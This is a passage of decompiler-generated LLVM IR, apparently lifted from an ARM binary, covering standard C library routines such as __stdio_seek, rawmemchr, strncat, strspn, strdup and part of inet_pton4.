  ret i32 -1

dec_label_pc_161ec:                               ; preds = %dec_label_pc_161b0
  %v1_161ec = and i32 %v3_161b0, 64
  %v2_161ec = icmp eq i32 %v1_161ec, 0
  br i1 %v2_161ec, label %dec_label_pc_1621c, label %dec_label_pc_161f4

dec_label_pc_161f4:                               ; preds = %dec_label_pc_161ec
  %v0_161f4 = call i32 @__stdio_wcommit()
  %v2_161f8 = icmp eq i32 %v0_161f4, 0
  br i1 %v2_161f8, label %dec_label_pc_16200, label %dec_label_pc_161d0

dec_label_pc_16200:                               ; preds = %dec_label_pc_161f4
  %v0_16200 = load i32, i32* @r4, align 4
  %v1_16200 = inttoptr i32 %v0_16200 to i32*
  %v2_16200 = load i32, i32* %v1_16200, align 4
  store i32 %v2_16200, i32* %r3.global-to-local, align 4
  %v1_16204 = add i32 %v0_16200, 8
  %v2_16204 = inttoptr i32 %v1_16204 to i32*
  %v3_16204 = load i32, i32* %v2_16204, align 4
  store i32 %v3_16204, i32* %r2.global-to-local, align 4
  %v1_16208 = and i32 %v2_16200, -65
  store i32 %v1_16208, i32* %r3.global-to-local, align 4
  %v3_1620c = sdiv i32 %v2_16200, 256
  store i32 %v3_1620c, i32* %r1.global-to-local, align 4
  %v2_16210 = add i32 %v0_16200, 28
  %v3_16210 = inttoptr i32 %v2_16210 to i32*
  store i32 %v3_16204, i32* %v3_16210, align 4
  %v0_16214 = load i32, i32* %r1.global-to-local, align 4
  %v1_16214 = trunc i32 %v0_16214 to i8
  %v2_16214 = load i32, i32* @r4, align 4
  %v3_16214 = add i32 %v2_16214, 1
  %v4_16214 = inttoptr i32 %v3_16214 to i8*
  store i8 %v1_16214, i8* %v4_16214, align 1
  %v0_16218 = load i32, i32* %r3.global-to-local, align 4
  %v1_16218 = trunc i32 %v0_16218 to i8
  %v2_16218 = load i32, i32* @r4, align 4
  %v3_16218 = inttoptr i32 %v2_16218 to i8*
  store i8 %v1_16218, i8* %v3_16218, align 1
  %v0_1621c.pre = load i32, i32* @r4, align 4
  %v0_16228.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1621c

dec_label_pc_1621c:                               ; preds = %dec_label_pc_161ec, %dec_label_pc_16200
  %v0_16228 = phi i32 [ 0, %dec_label_pc_161ec ], [ %v0_16228.pre, %dec_label_pc_16200 ]
  %v2_1622c = phi i32 [ %v0_161b0, %dec_label_pc_161ec ], [ %v0_1621c.pre, %dec_label_pc_16200 ]
  %v1_1621c = inttoptr i32 %v2_1622c to i32*
  %v2_1621c = load i32, i32* %v1_1621c, align 4
  %v1_16220 = or i32 %v2_1621c, 1
  store i32 %v1_16220, i32* %r3.global-to-local, align 4
  %v3_16224 = sdiv i32 %v2_1621c, 256
  store i32 %v3_16224, i32* %r2.global-to-local, align 4
  %v1_1622c = trunc i32 %v3_16224 to i8
  %v3_1622c = add i32 %v2_1622c, 1
  %v4_1622c = inttoptr i32 %v3_1622c to i8*
  store i8 %v1_1622c, i8* %v4_1622c, align 1
  %v0_16230 = load i32, i32* %r3.global-to-local, align 4
  %v1_16230 = trunc i32 %v0_16230 to i8
  %v2_16230 = load i32, i32* @r4, align 4
  %v3_16230 = inttoptr i32 %v2_16230 to i8*
  store i8 %v1_16230, i8* %v3_16230, align 1
  %v2_16234 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16234, i32* @r4, align 4
  ret i32 %v0_16228

; uselistorder directives
  uselistorder i32 %v3_16224, { 1, 0 }
  uselistorder i32 %v3_161d8, { 1, 0 }
  uselistorder i32 %v3_161b0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_161b0, { 0, 2, 1 }
  uselistorder i32 %v3_161a4, { 1, 0 }
  uselistorder i32 %v5_16188, { 0, 2, 1, 3 }
  uselistorder i32 ()* @__stdio_wcommit, { 2, 5, 4, 3, 1, 0 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder label %dec_label_pc_1621c, { 1, 0 }
  uselistorder label %dec_label_pc_161c4, { 1, 0 }
  uselistorder label %dec_label_pc_161b0, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v3_1623c = load i32, i32* @r4, align 4
  %v6_1623c = load i32, i32* @lr, align 4
  %v1_16240 = add i32 %arg1, 4
  %v2_16240 = inttoptr i32 %v1_16240 to i32*
  %v3_16240 = load i32, i32* %v2_16240, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_16248 = load i32, i32* %arg2, align 4
  %v3_16248 = add i32 %tmp, 4
  %v4_16248 = inttoptr i32 %v3_16248 to i32*
  %v5_16248 = load i32, i32* %v4_16248, align 4
  %v6_1624c = call i32 @__libc_lseek64(i32 %v3_16240, i32 %v2_16248, i32 %v5_16248, i32 %arg3, i32 %v3_1623c, i32 %v6_1623c)
  %v1_16250 = icmp slt i32 %v2_16248, 0
  %v6_1624c. = select i1 %v1_16250, i32 %v6_1624c, i32 0
  store i32 %v6_1624c., i32* %r3.global-to-local, align 4
  br i1 %v1_16250, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v3_1625c = load i32, i32* @r4, align 4
  %v4_1625c = inttoptr i32 %v3_1625c to i32*
  store i32 %v6_1624c, i32* %v4_1625c, align 4
  %v6_1625c = add i32 %v3_1625c, 4
  %v7_1625c = inttoptr i32 %v6_1625c to i32*
  store i32 %v2_16248, i32* %v7_1625c, align 4
  %v0_16260.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v0_16260 = phi i32 [ %v6_1624c, %entry ], [ %v0_16260.pre, %bb ]
  ret i32 %v0_16260

; uselistorder directives
  uselistorder i32 %v6_1624c, { 0, 2, 1 }
  uselistorder i32 %v2_16248, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1628c:
  %v1_1626c = urem i32 %arg1, 256
  store i32 %v1_1626c, i32* @lr, align 4
  %v4_1628c = mul nuw nsw i32 %v1_1626c, 256
  %v5_1628c = or i32 %v4_1628c, %v1_1626c
  %v4_16294 = mul i32 %v5_1628c, 65536
  %v5_16294 = or i32 %v4_16294, %v5_1628c
  %v0_16298.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_16298

dec_label_pc_16298:                               ; preds = %dec_label_pc_16304, %dec_label_pc_16298, %dec_label_pc_1628c
  %v0_16298 = phi i32 [ %v0_16298.pre, %dec_label_pc_1628c ], [ %v4_16298, %dec_label_pc_16298 ], [ %v4_16298, %dec_label_pc_16304 ]
  %v1_16298 = inttoptr i32 %v0_16298 to i32*
  %v2_16298 = load i32, i32* %v1_16298, align 4
  %v4_16298 = add i32 %v0_16298, 4
  store i32 %v4_16298, i32* @ip, align 4
  %v2_162a0 = xor i32 %v2_16298, %v5_16294
  %v2_162a4 = add i32 %v2_162a0, 2130640639
  %v1_162ac = sub i32 -1, %v2_162a0
  %v2_162b0 = xor i32 %v2_162a4, %v1_162ac
  %v2_162b4 = and i32 %v2_162b0, -2130640640
  %v2_162b8 = icmp eq i32 %v2_162b4, 0
  br i1 %v2_162b8, label %dec_label_pc_16298, label %dec_label_pc_162c0

dec_label_pc_162c0:                               ; preds = %dec_label_pc_16298
  %v2_162c0 = inttoptr i32 %v0_16298 to i8*
  %v3_162c0 = load i8, i8* %v2_162c0, align 1
  %v4_162c0 = zext i8 %v3_162c0 to i32
  %v9_162c8 = icmp eq i32 %v4_162c0, %v1_1626c
  store i1 %v9_162c8, i1* @cpsr_z, align 1
  %v1_162cc = add i32 %v0_16298, 3
  %v1_162d0 = add i32 %v0_16298, 1
  %v1_162d4 = add i32 %v0_16298, 2
  br i1 %v9_162c8, label %bb, label %bb18

bb:                                               ; preds = %dec_label_pc_162c0
  ret i32 %v0_16298

bb18:                                             ; preds = %dec_label_pc_162c0
  %v2_162dc = inttoptr i32 %v1_162d0 to i8*
  %v3_162dc = load i8, i8* %v2_162dc, align 1
  %v4_162dc = zext i8 %v3_162dc to i32
  %v9_162e0 = icmp eq i32 %v4_162dc, %v1_1626c
  store i1 %v9_162e0, i1* @cpsr_z, align 1
  br i1 %v9_162e0, label %dec_label_pc_162e8, label %dec_label_pc_162f0

dec_label_pc_162e8:                               ; preds = %bb18
  ret i32 %v1_162d0

dec_label_pc_162f0:                               ; preds = %bb18
  %v2_162f0 = inttoptr i32 %v1_162d4 to i8*
  %v3_162f0 = load i8, i8* %v2_162f0, align 1
  %v4_162f0 = zext i8 %v3_162f0 to i32
  %v9_162f4 = icmp eq i32 %v4_162f0, %v1_1626c
  store i1 %v9_162f4, i1* @cpsr_z, align 1
  br i1 %v9_162f4, label %dec_label_pc_162fc, label %dec_label_pc_16304

dec_label_pc_162fc:                               ; preds = %dec_label_pc_162f0
  ret i32 %v1_162d4

dec_label_pc_16304:                               ; preds = %dec_label_pc_162f0
  %v2_16304 = inttoptr i32 %v1_162cc to i8*
  %v3_16304 = load i8, i8* %v2_16304, align 1
  %v4_16304 = zext i8 %v3_16304 to i32
  %v9_16308 = icmp eq i32 %v4_16304, %v1_1626c
  store i1 %v9_16308, i1* @cpsr_z, align 1
  br i1 %v9_16308, label %dec_label_pc_16310, label %dec_label_pc_16298

dec_label_pc_16310:                               ; preds = %dec_label_pc_16304
  ret i32 %v1_162cc

; uselistorder directives
  uselistorder i32 %v4_16298, { 2, 1, 0 }
  uselistorder i32 %v0_16298, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1628c, { 1, 0 }
  uselistorder i32 %v1_1626c, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i1* @cpsr_z, { 8, 9, 10, 11, 1, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 0, 2, 3, 14, 4, 5, 6, 7, 23 }
  uselistorder i32 -2130640640, { 6, 7, 2, 0, 8, 3, 1, 4, 5 }
  uselistorder i32 2130640639, { 5, 6, 1, 0, 2, 3, 4 }
}

define i32 @__GI_strncat(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16320 = load i32, i32* @r4, align 4
  store i32 %v3_16320, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1632c

dec_label_pc_1632c:                               ; preds = %dec_label_pc_1632c, %entry
  %v0_1632c = phi i32 [ %v5_1632c, %dec_label_pc_1632c ], [ %tmp, %entry ]
  %v1_1632c = inttoptr i32 %v0_1632c to i8*
  %v2_1632c = load i8, i8* %v1_1632c, align 1
  %v3_1632c = zext i8 %v2_1632c to i32
  store i32 %v3_1632c, i32* @ip, align 4
  %v5_1632c = add i32 %v0_1632c, 1
  store i32 %v5_1632c, i32* %r3.global-to-local, align 4
  %v2_16330 = icmp eq i8 %v2_1632c, 0
  store i1 %v2_16330, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16330, label %dec_label_pc_16338, label %dec_label_pc_1632c

dec_label_pc_16338:                               ; preds = %dec_label_pc_1632c
  %v0_16338 = load i32, i32* %r2.global-to-local, align 4
  %v7_16338 = icmp eq i32 %v0_16338, 3
  store i1 %v7_16338, i1* %cpsr_z.global-to-local, align 1
  %v1_1633c = add i32 %v0_1632c, -1
  store i32 %v1_1633c, i32* %lr.global-to-local, align 4
  %tmp10 = icmp ult i32 %v0_16338, 4
  br i1 %tmp10, label %dec_label_pc_163d0thread-pre-split, label %dec_label_pc_16344

dec_label_pc_16344:                               ; preds = %dec_label_pc_16338
  %v3_16344 = udiv i32 %v0_16338, 4
  store i32 %v3_16344, i32* %r0.global-to-local, align 4
  %v0_16348.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_16348

dec_label_pc_16348:                               ; preds = %dec_label_pc_163a8, %dec_label_pc_16344
  %v2_16350 = phi i32 [ %v1_163a0, %dec_label_pc_163a8 ], [ %v1_1633c, %dec_label_pc_16344 ]
  %v0_16348 = phi i32 [ %v1_1639c, %dec_label_pc_163a8 ], [ %v0_16348.pre, %dec_label_pc_16344 ]
  %v1_16348 = inttoptr i32 %v0_16348 to i8*
  %v2_16348 = load i8, i8* %v1_16348, align 1
  %v3_16348 = zext i8 %v2_16348 to i32
  store i32 %v3_16348, i32* %r3.global-to-local, align 4
  %v2_1634c = icmp eq i8 %v2_16348, 0
  store i1 %v2_1634c, i1* %cpsr_z.global-to-local, align 1
  %v3_16350 = add i32 %v2_16350, 1
  %v4_16350 = inttoptr i32 %v3_16350 to i8*
  store i8 %v2_16348, i8* %v4_16350, align 1
  %v0_16354 = load i32, i32* %lr.global-to-local, align 4
  %v1_16354 = add i32 %v0_16354, 1
  store i32 %v1_16354, i32* @ip, align 4
  %v0_16358 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16358, label %.loopexit, label %dec_label_pc_1635c

dec_label_pc_1635c:                               ; preds = %dec_label_pc_16348
  %v0_1635c = load i32, i32* @r1, align 4
  %v1_1635c = add i32 %v0_1635c, 1
  %v2_1635c = inttoptr i32 %v1_1635c to i8*
  %v3_1635c = load i8, i8* %v2_1635c, align 1
  %v4_1635c = zext i8 %v3_1635c to i32
  store i32 %v4_1635c, i32* %r3.global-to-local, align 4
  %v2_16360 = icmp eq i8 %v3_1635c, 0
  store i1 %v2_16360, i1* %cpsr_z.global-to-local, align 1
  %v3_16364 = add i32 %v0_16354, 2
  %v4_16364 = inttoptr i32 %v3_16364 to i8*
  store i8 %v3_1635c, i8* %v4_16364, align 1
  %v0_16368 = load i32, i32* @r1, align 4
  %v1_16368 = add i32 %v0_16368, 1
  store i32 %v1_16368, i32* %r1.global-to-local, align 4
  %v0_1636c = load i32, i32* @ip, align 4
  %v1_1636c = add i32 %v0_1636c, 1
  store i32 %v1_1636c, i32* @ip, align 4
  %v0_16370 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16370, label %.loopexit, label %dec_label_pc_16374

dec_label_pc_16374:                               ; preds = %dec_label_pc_1635c
  %v1_16374 = add i32 %v0_16368, 2
  %v2_16374 = inttoptr i32 %v1_16374 to i8*
  %v3_16374 = load i8, i8* %v2_16374, align 1
  %v4_16374 = zext i8 %v3_16374 to i32
  store i32 %v4_16374, i32* %r3.global-to-local, align 4
  %v2_16378 = icmp eq i8 %v3_16374, 0
  store i1 %v2_16378, i1* %cpsr_z.global-to-local, align 1
  %v3_1637c = add i32 %v0_1636c, 2
  %v4_1637c = inttoptr i32 %v3_1637c to i8*
  store i8 %v3_16374, i8* %v4_1637c, align 1
  %v0_16380 = load i32, i32* %r1.global-to-local, align 4
  %v1_16380 = add i32 %v0_16380, 1
  store i32 %v1_16380, i32* %r1.global-to-local, align 4
  %v0_16384 = load i32, i32* @ip, align 4
  %v1_16384 = add i32 %v0_16384, 1
  store i32 %v1_16384, i32* %lr.global-to-local, align 4
  %v0_16388 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16388, label %.loopexit, label %dec_label_pc_1638c

dec_label_pc_1638c:                               ; preds = %dec_label_pc_16374
  %v1_1638c = add i32 %v0_16380, 2
  %v2_1638c = inttoptr i32 %v1_1638c to i8*
  %v3_1638c = load i8, i8* %v2_1638c, align 1
  %v4_1638c = zext i8 %v3_1638c to i32
  store i32 %v4_1638c, i32* @ip, align 4
  store i32 %v1_1638c, i32* %r3.global-to-local, align 4
  %v2_16394 = icmp eq i8 %v3_1638c, 0
  store i1 %v2_16394, i1* %cpsr_z.global-to-local, align 1
  %v3_16398 = add i32 %v0_16384, 2
  %v4_16398 = inttoptr i32 %v3_16398 to i8*
  store i8 %v3_1638c, i8* %v4_16398, align 1
  %v0_1639c = load i32, i32* %r3.global-to-local, align 4
  %v1_1639c = add i32 %v0_1639c, 1
  store i32 %v1_1639c, i32* @r1, align 4
  %v0_163a0 = load i32, i32* %lr.global-to-local, align 4
  %v1_163a0 = add i32 %v0_163a0, 1
  store i32 %v1_163a0, i32* %lr.global-to-local, align 4
  %v0_163a4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_163a4, label %.loopexit, label %dec_label_pc_163a8

dec_label_pc_163a8:                               ; preds = %dec_label_pc_1638c
  %v0_163a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_163a8 = add i32 %v0_163a8, -1
  store i32 %v1_163a8, i32* %r0.global-to-local, align 4
  %v7_163a8 = icmp eq i32 %v0_163a8, 1
  store i1 %v7_163a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_163a8, label %dec_label_pc_163b0, label %dec_label_pc_16348

dec_label_pc_163b0:                               ; preds = %dec_label_pc_163a8
  %v0_163b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_163b0 = urem i32 %v0_163b0, 4
  store i32 %v1_163b0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_163d0

dec_label_pc_163b8:                               ; preds = %dec_label_pc_163d0
  %v0_163b8 = load i32, i32* @r1, align 4
  %v1_163b8 = inttoptr i32 %v0_163b8 to i8*
  %v2_163b8 = load i8, i8* %v1_163b8, align 1
  %v3_163b8 = zext i8 %v2_163b8 to i32
  store i32 %v3_163b8, i32* @ip, align 4
  %v2_163bc = icmp eq i8 %v2_163b8, 0
  store i1 %v2_163bc, i1* %cpsr_z.global-to-local, align 1
  %v1_163c0 = add i32 %v1_163dc, -1
  store i32 %v1_163c0, i32* %r2.global-to-local, align 4
  %v3_163c4 = add i32 %v3_163dc, 1
  %v4_163c4 = inttoptr i32 %v3_163c4 to i8*
  store i8 %v2_163b8, i8* %v4_163c4, align 1
  %v5_163c4 = load i32, i32* %lr.global-to-local, align 4
  %v6_163c4 = add i32 %v5_163c4, 1
  store i32 %v6_163c4, i32* %lr.global-to-local, align 4
  %v0_163c8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_163c8, label %.loopexit, label %dec_label_pc_163cc

dec_label_pc_163cc:                               ; preds = %dec_label_pc_163b8
  %v0_163cc = load i32, i32* @r1, align 4
  %v1_163cc = add i32 %v0_163cc, 1
  store i32 %v1_163cc, i32* @r1, align 4
  %v0_163d0.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_163d0thread-pre-split

dec_label_pc_163d0thread-pre-split:               ; preds = %dec_label_pc_163cc, %dec_label_pc_16338
  %v2_163c46 = phi i32 [ %v6_163c4, %dec_label_pc_163cc ], [ %v1_1633c, %dec_label_pc_16338 ]
  %v0_163d0.pr = phi i32 [ %v0_163d0.pr.pre, %dec_label_pc_163cc ], [ %v0_16338, %dec_label_pc_16338 ]
  br label %dec_label_pc_163d0

dec_label_pc_163d0:                               ; preds = %dec_label_pc_163d0thread-pre-split, %dec_label_pc_163b0
  %v3_163dc = phi i32 [ %v2_163c46, %dec_label_pc_163d0thread-pre-split ], [ %v1_163a0, %dec_label_pc_163b0 ]
  %v1_163dc = phi i32 [ %v0_163d0.pr, %dec_label_pc_163d0thread-pre-split ], [ %v1_163b0, %dec_label_pc_163b0 ]
  %v2_163d0 = icmp eq i32 %v1_163dc, 0
  store i1 %v2_163d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_163d0, label %dec_label_pc_163d8, label %dec_label_pc_163b8

dec_label_pc_163d8:                               ; preds = %dec_label_pc_163d0
  %v0_163d8 = load i32, i32* @ip, align 4
  %v2_163d8 = icmp eq i32 %v0_163d8, 0
  store i1 %v2_163d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_163d8, label %.loopexit, label %bb

bb:                                               ; preds = %dec_label_pc_163d8
  %v4_163dc = add i32 %v3_163dc, 1
  %v5_163dc = inttoptr i32 %v4_163dc to i8*
  store i8 0, i8* %v5_163dc, align 1
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_1638c, %dec_label_pc_16374, %dec_label_pc_1635c, %dec_label_pc_16348, %dec_label_pc_163b8, %dec_label_pc_163d8, %bb
  %v0_163e0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_163e0, i32* %r0.global-to-local, align 4
  %v2_163e4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_163e4, i32* @r4, align 4
  ret i32 %v0_163e0

; uselistorder directives
  uselistorder i32 %v1_163dc, { 1, 0 }
  uselistorder i32 %v1_163b0, { 1, 0 }
  uselistorder i32 %v0_163a8, { 1, 0 }
  uselistorder i32 %v1_163a0, { 0, 2, 1 }
  uselistorder i32 %v1_1639c, { 1, 0 }
  uselistorder i32 %v0_16338, { 2, 1, 0, 3 }
  uselistorder i32 %v5_1632c, { 1, 0 }
  uselistorder i32 %v0_1632c, { 0, 2, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 4, 1, 2, 3, 5, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder label %.loopexit, { 6, 5, 4, 0, 1, 2, 3 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* @lr, align 4
  %v0_164202 = load i32, i32* @r0, align 4
  %v1_164203 = inttoptr i32 %v0_164202 to i8*
  %v2_164204 = load i8, i8* %v1_164203, align 1
  %v2_164246 = icmp eq i8 %v2_164204, 0
  br i1 %v2_164246, label %dec_label_pc_16430, label %dec_label_pc_163fc.preheader

dec_label_pc_163f4:                               ; preds = %dec_label_pc_163fc
  %v1_16404 = add i32 %v0_16404, 1
  %v9_163f4 = icmp eq i8 %v0_16410.in, %v2_163fc
  br i1 %v9_163f4, label %dec_label_pc_16410, label %dec_label_pc_163fc

dec_label_pc_163fc:                               ; preds = %dec_label_pc_163fc.preheader, %dec_label_pc_163f4
  %v0_16404 = phi i32 [ %tmp, %dec_label_pc_163fc.preheader ], [ %v1_16404, %dec_label_pc_163f4 ]
  %v1_163fc = inttoptr i32 %v0_16404 to i8*
  %v2_163fc = load i8, i8* %v1_163fc, align 1
  %v3_163fc = zext i8 %v2_163fc to i32
  store i32 %v3_163fc, i32* @ip, align 4
  %v2_16400 = icmp eq i8 %v2_163fc, 0
  br i1 %v2_16400, label %dec_label_pc_16430, label %dec_label_pc_163f4

dec_label_pc_16410:                               ; preds = %dec_label_pc_163f4
  %v2_16410 = icmp eq i8 %v0_16410.in, 0
  br i1 %v2_16410, label %dec_label_pc_16430, label %dec_label_pc_16418

dec_label_pc_16418:                               ; preds = %dec_label_pc_16410
  %v1_16418 = add i32 %v0_16418, 1
  store i32 %v1_16418, i32* @lr, align 4
  %v1_1641c = add i32 %v0_1641c, 1
  %v1_16420 = inttoptr i32 %v1_1641c to i8*
  %v2_16420 = load i8, i8* %v1_16420, align 1
  %v2_16424 = icmp eq i8 %v2_16420, 0
  br i1 %v2_16424, label %dec_label_pc_16430, label %dec_label_pc_163fc.preheader

dec_label_pc_163fc.preheader:                     ; preds = %entry, %dec_label_pc_16418
  %v0_1641c = phi i32 [ %v1_1641c, %dec_label_pc_16418 ], [ %v0_164202, %entry ]
  %v0_16418 = phi i32 [ %v1_16418, %dec_label_pc_16418 ], [ 0, %entry ]
  %v0_16410.in = phi i8 [ %v2_16420, %dec_label_pc_16418 ], [ %v2_164204, %entry ]
  br label %dec_label_pc_163fc

dec_label_pc_16430:                               ; preds = %dec_label_pc_16410, %dec_label_pc_16418, %dec_label_pc_163fc, %entry
  %v0_16430 = phi i32 [ 0, %entry ], [ %v0_16418, %dec_label_pc_163fc ], [ %v1_16418, %dec_label_pc_16418 ], [ %v0_16418, %dec_label_pc_16410 ]
  ret i32 %v0_16430

; uselistorder directives
  uselistorder i8 %v0_16410.in, { 1, 0 }
  uselistorder i8 %v2_163fc, { 1, 2, 0 }
  uselistorder i32 %v0_16404, { 1, 0 }
  uselistorder label %dec_label_pc_16430, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_163fc.preheader, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_16438 = load i32, i32* @r4, align 4
  store i32 %v3_16438, i32* %stack_var_-12, align 4
  %v6_16438 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_16440 = call i32 @strlen(i8* %arg1)
  %v1_16444 = add i32 %v3_16440, 1
  store i32 %v1_16444, i32* @r4, align 4
  %v1_1644c = call i32 @malloc(i32 %v1_16444)
  store i32 91232, i32* @lr, align 4
  %v1_1645c = icmp ne i32 %v1_1644c, 0
  call void @__pseudo_cond_branch(i1 %v1_1645c, i32 ptrtoint (i32* @global_var_11710.827 to i32))
  %v2_16464 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16464, i32* @r4, align 4
  store i32 %v6_16438, i32* @r5, align 4
  ret i32 %v1_1644c

; uselistorder directives
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 4, 9, 10, 11, 8, 15, 13, 14, 12, 6, 2, 3, 0, 7, 1, 5 }
  uselistorder i32 (i32)* @malloc, { 8, 5, 4, 14, 15, 7, 6, 13, 12, 11, 10, 9, 3, 2, 1, 0 }
}

define i32 @inet_pton4(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_16468 = load i32, i32* @r5, align 4
  %v2_16470 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg2, i32* @r5, align 4
  store i32 0, i32* @lr, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v2_16470, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-16, align 4
  %v2_164f83 = load i8, i8* %arg1, align 1
  %v3_164f84 = zext i8 %v2_164f83 to i32
  store i32 %v3_164f84, i32* @ip, align 4
  %v5_164f85 = add i32 %tmp, 1
  store i32 %v5_164f85, i32* @r4, align 4
  %v2_164fc6 = icmp eq i8 %v2_164f83, 0
  store i1 %v2_164fc6, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_164fc6, label %dec_label_pc_16508, label %dec_label_pc_16490

dec_label_pc_16490:                               ; preds = %entry, %dec_label_pc_164f8.backedge
  %v0_164d4 = phi i32 [ %v3_164f8, %dec_label_pc_164f8.backedge ], [ %v3_164f84, %entry ]
  %v1_1650010.in = phi i32 [ %v3_164f8, %dec_label_pc_164f8.backedge ], [ %v3_164f84, %entry ]
  %v1_1650010 = add nsw i32 %v1_1650010.in, -48
  %v2_16490 = icmp ugt i32 %v1_1650010, 8
  %v7_16490 = icmp eq i32 %v1_1650010, 9
  store i1 %v7_16490, i1* %cpsr_z.global-to-local, align 1
  %v2_16498 = xor i1 %v7_16490, true
  %v3_16498 = and i1 %v2_16490, %v2_16498
  br i1 %v3_16498, label %dec_label_pc_164d4, label %dec_label_pc_1649c

dec_label_pc_1649c:                               ; preds = %dec_label_pc_16490
  %v0_1649c = load i32, i32* %r0.global-to-local, align 4
  %v1_1649c = inttoptr i32 %v0_1649c to i8*
  %v2_1649c = load i8, i8* %v1_1649c, align 1
  %v3_1649c = zext i8 %v2_1649c to i32
  %v3_164a4 = mul nuw nsw i32 %v3_1649c, 10
  %v4_164a4 = add nuw nsw i32 %v3_164a4, %v0_164d4
  %v1_164a8 = add nsw i32 %v4_164a4, -48
  %v2_164ac = icmp ugt i32 %v1_164a8, 254
  %v7_164ac = icmp eq i32 %v1_164a8, 255
  store i1 %v7_164ac, i1* %cpsr_z.global-to-local, align 1
  %v2_164b0 = xor i1 %v7_164ac, true
  %v3_164b0 = and i1 %v2_164ac, %v2_164b0
  br i1 %v3_164b0, label %dec_label_pc_1652c, label %dec_label_pc_164b4

dec_label_pc_164b4:                               ; preds = %dec_label_pc_1649c
  %v0_164b4 = load i32, i32* %r1.global-to-local, align 4
  %v2_164b4 = icmp eq i32 %v0_164b4, 0
  store i1 %v2_164b4, i1* %cpsr_z.global-to-local, align 1
  %v1_164b8 = trunc i32 %v1_164a8 to i8
  store i8 %v1_164b8, i8* %v1_1649c, align 1
  %v0_164bc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_164bc, label %dec_label_pc_164c0, label %dec_label_pc_164f8.backedge

dec_label_pc_164c0:                               ; preds = %dec_label_pc_164b4
  %v0_164c0 = load i32, i32* @lr, align 4
  %v1_164c0 = add i32 %v0_164c0, 1
  store i32 %v1_164c0, i32* @lr, align 4
  %v7_164c4 = icmp eq i32 %v1_164c0, 4
  store i1 %v7_164c4, i1* %cpsr_z.global-to-local, align 1
